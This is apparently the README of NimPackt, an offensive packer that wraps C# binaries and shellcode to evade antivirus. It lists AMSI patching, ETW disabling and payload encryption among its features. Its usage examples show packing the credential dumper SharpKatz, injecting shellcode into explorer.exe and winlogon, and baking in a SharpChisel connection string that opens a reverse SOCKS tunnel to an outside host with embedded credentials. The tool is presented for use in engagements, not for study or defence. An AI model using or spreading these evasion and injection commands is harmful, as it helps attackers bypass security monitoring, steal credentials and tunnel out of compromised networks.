![NimPackt](assets/Nimpackt-Logo-Blacktext.png)

# A Nim-based packer for C# / .NET executables and raw shellcode

## Description

> ⚠ NimPackt is still under active development and will contain bugs/oversights/flaws. Though generated binaries should be OpSec-safe, please verify this yourself before deploying them in active engagements. Kthx.

NimPackt is a Nim-based packer for C# / .NET executables and raw shellcode. It automatically wraps these executables (along with its arguments) in a Nim binary that is compiled to Native C and as such harder to detect or reverse engineer. Currently, it has the following features.

- Patching the Anti-Malware Scan Interface (AMSI)
- Disabling Event Tracing for Windows (ETW)
- Payload encryption (AES-128 CTR) to prevent static analysis
- Obfuscating static strings used in the binary
- Supports cross-platform compilation (from both Linux and Windows)
- Supports both x64/x86 compilation (make sure to grab the right architecture for the ingested binary)

A great source for C#-based binaries for offensive tooling can be found [here](https://github.com/Flangvik/SharpCollection). It is highly recommended to compile the C# binaries yourself. Even though embedded binaries are encrypted, you should obfuscate sensitive binaries (such as Mimikatz) to lower the risk of detection.

If you want to go all-out on OpSec, you could re-pack the Nim binary using a tool like [PEzor](https://github.com/phra/PEzor) to remove userland hooks (until Project5 is supported) or even launch it from memory using CobaltStrike, though this is a bit beyond the purpose of NimPackt 😙

## Installation

On **Linux**, simply install the required packages and use the Nimble package installer to install the required packages and Python libraries.

```
sudo apt install -y python3 mingw-w64 nim
pip3 install pycryptodome argparse
nimble install winim strenc nimcrypto
```

On **Windows**, execute the Nim installer from [here](https://nim-lang.org/install_windows.html). Make sure to install `mingw` and set the path values correctly using the provided `finish.exe` utility. If you don't have Python3 install that, then install the required packages as follows.

```
nimble install winim strenc nimcrypto
pip3 install pycryptodome argparse
```

## Usage

```
usage: NimPackt.py [-h] -e EXECUTIONMODE -i INPUTFILE [-a [ARGUMENTS]] [-r] [-t INJECTTARGET] [-E] [-32] [-H] [-na] [-ne] [-v] [-V]

required arguments:
  -e EXECUTIONMODE, --executionmode EXECUTIONMODE
                        Execution mode of the packer. Supports "execute-assembly" or "shinject"
  -i INPUTFILE, --inputfile INPUTFILE
                        C# .NET binary executable (.exe) or shellcode (.bin) to wrap

execute-assembly arguments:
  -a [ARGUMENTS], --arguments [ARGUMENTS]
                        Arguments to "bake into" the wrapped binary, or "PASSTHRU" to accept run-time arguments (default)

shinject arguments:
  -r, --remote          Inject shellcode into remote process (default false)
  -t INJECTTARGET, --target INJECTTARGET
                        Remote thread targeted for remote process injection (default "explorer.exe", implies -r)
  -E, --existing        Remote inject into existing process rather than a newly spawned one (default false, implies -r) (WARNING: VOLATILE)

other arguments:
  -32, --32bit          Compile in 32-bit mode
  -H, --hideapp         Hide the app frontend (console output) by compiling it in GUI mode
  -na, --nopatchamsi    Do NOT patch (disable) the Anti-Malware Scan Interface (AMSI)
  -ne, --nodisableetw   Do NOT disable Event Tracing for Windows (ETW)
  -v, --verbose         Print debug messages of the wrapped binary at runtime
  -V, --version         show program's version number and exit
```

**Examples:**

```
# Pack SharpKatz to accept commands at runtime, patch AMSI and disable ETW while printing verbose messages on runtime
python3 ./NimPackt.py -v -e execute-assembly -i bins/SharpKatz-x64.exe

# Pack SharpChisel with a built-in ChiselChief connection string, do not patch AMSI or disable ETW, hide the application window on runtime
python3 NimPackt.py -H -e execute-assembly -i bins/SharpChisel.exe -a 'client --auth nimpackt.demo_A:718nubCpwiuLUW --keepalive 25s --max-retry-interval 25s https://chisel.azurewebsites.net R:10073:socks'

# Pack raw shellcode to execute in the local thread, hiding the Nim binary window
# Shellcode generated with 'msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o /tmp/calc.bin'
python3 NimPackt.py -i calc.bin -e shinject -H

# Pack raw shellcode to execute in a newly spawned Explorer thread, enabling log messages in the compiled Nim binary
python3 NimPackt.py -r -i calc.bin -e shinject 

# Pack raw shellcode to execute in the existing Winlogon process
python3 NimPackt.py -r -E -i calc.bin -e shinject 
```

## Known issues

- The `-H` flag doesn't seem to properly hide the output of the executed assembly when `execute-assembly` mode is used. This probably relates to C# compiling options, need to investigate this further.
- Shellcode doesn't seem to return correctly over all injection methods. This is not a problem for local injection (since the Nim thread can die anyway), but for remote injections it will cause the process to crash in most instances. For a sacrificial process this might be okay, but for existing processes (-E) this is not acceptable. Need to look into making shellcode properly return.

## Wishlist

- Provide option to deploy `Project5` to unhook API calls before execution
- Provide option to pack as dll library
- A CobaltStrike plugin 🤗